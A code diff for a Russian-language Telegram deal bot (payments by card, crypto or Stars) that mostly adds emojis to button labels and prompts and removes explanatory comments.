+        'about': 'ℹ️ 关于服务'
     }
 }
 
@@ -402,15 +404,13 @@ def tr(key, lang='ru', **kwargs):
         return text
 
 # ==================================================
-# ОТПРАВКА ФОТО ТОЛЬКО ДЛЯ ГЛАВНОГО МЕНЮ И СДЕЛОК
+# ОТПРАВКА ФОТО (ТОЛЬКО ДЛЯ ГЛАВНОГО МЕНЮ И СДЕЛОК)
 # ==================================================
 async def send_start_menu(chat_id, text, reply_markup=None, parse_mode="HTML"):
-    """Используется только для главного меню и сделок. Если фото не грузится, падает на текст."""
     try:
         await bot.send_photo(chat_id=chat_id, photo=PHOTO_URL, caption=text, reply_markup=reply_markup, parse_mode=parse_mode)
     except Exception as e:
-        # Если фото недоступно, просто отправляем текст (чтобы не вылетала фиолетовая ошибка)
-        logging.warning(f"Фото не прогрузилось, отправляю текст: {e}")
+        logging.warning(f"Фото не прогрузилось: {e}. Отправляю текст.")
         await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
 
 # ==================================================
@@ -457,16 +457,16 @@ def get_payment_methods(lang="ru"):
 
 def get_requisites_menu(lang="ru"):
     builder = InlineKeyboardBuilder()
-    builder.row(InlineKeyboardButton(text="Карта", callback_data="req_card"))
-    builder.row(InlineKeyboardButton(text="Крипта", callback_data="req_crypto"))
-    builder.row(InlineKeyboardButton(text="Stars", callback_data="req_stars"))
+    builder.row(InlineKeyboardButton(text="💳 Карта", callback_data="req_card"))
+    builder.row(InlineKeyboardButton(text="🪙 Крипта", callback_data="req_crypto"))
+    builder.row(InlineKeyboardButton(text="⭐ Stars", callback_data="req_stars"))
     builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
     return builder.as_markup()
 
 def get_funds_menu(lang="ru"):
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text="💳 Пополнить", callback_data="funds_deposit"))
-    builder.row(InlineKeyboardButton(text="💰 Вывести", callback_data="funds_withdraw"))
+    builder.row(InlineKeyboardButton(text="💸 Вывести", callback_data="funds_withdraw"))
     builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
     return builder.as_markup()
 
@@ -543,7 +543,6 @@ async def start(message: Message, state: FSMContext):
             except Exception as e:
                 logging.error(f"Ошибка реферальной ссылки: {e}")
 
-    # Используем фото только в главном меню
     await send_start_menu(message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang))
 
 async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
@@ -581,7 +580,6 @@ async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="✅ Подтвердить участие", callback_data=f"confirm_seller_{deal_id}")]
             ])
-            # В сделках оставляем фото (это красиво)
             await send_start_menu(message.chat.id, text, reply_markup=kb)
         elif user_id == buyer_id:
             text = tr('deal_show_buyer', lang).format(deal_id=d_id)
@@ -601,7 +599,6 @@ async def main_menu_callback(callback: CallbackQuery):
         lang = row[0] if row else 'ru'
     except:
         lang = 'ru'
-    # В главное меню отправляем фото
     await send_start_menu(callback.message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang))
     await callback.answer()
 
@@ -614,7 +611,6 @@ async def create_deal_callback(callback: CallbackQuery, state: FSMContext):
         lang = row[0] if row else 'ru'
     except:
         lang = 'ru'
-    # Везде ниже используем bot.send_message БЕЗ ФОТО (только текст и кнопки)
     await bot.send_message(callback.message.chat.id, tr('create_deal_msg', lang), reply_markup=get_roles_menu(lang), parse_mode="HTML")
     await callback.answer()
 
@@ -726,11 +722,11 @@ async def seller_amount(message: Message, state: FSMContext):
         lang = 'ru'
 
     if currency in ['rub', 'uah', 'byn']:
-        req_text = "Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки."
+        req_text = "💳 Введите номер карты\n\n📌 На нее будет отправлена оплата после завершения сделки."
     elif currency == 'stars':
-        req_text = "Введите юзернейм для получения Stars\n\nНапример: @username"
+        req_text = "⭐ Введите юзернейм для получения Stars\n\n📌 Например: @username"
     elif currency in ['usdt', 'ton']:
-        req_text = "Введите адрес криптокошелька"
+        req_text = "🪙 Введите адрес криптокошелька"
     else:
         await state.clear()
         await message.answer("🚫 Неизвестная валюта. Начните заново.")
@@ -853,7 +849,7 @@ async def buyer_amount(message: Message, state: FSMContext):
         await message.answer("⚠️ Сумма должна быть больше нуля.")
         return
     await state.update_data(amount=amount)
-    await bot.send_message(message.chat.id, "Введите @username продавца.\n\nНапример: @seller", parse_mode="HTML")
+    await bot.send_message(message.chat.id, "👤 Введите @username продавца.\n\n📌 Например: @seller", parse_mode="HTML")
     await state.set_state(DealStates.buyer_seller_username)
 
 @dp.message(DealStates.buyer_seller_username)
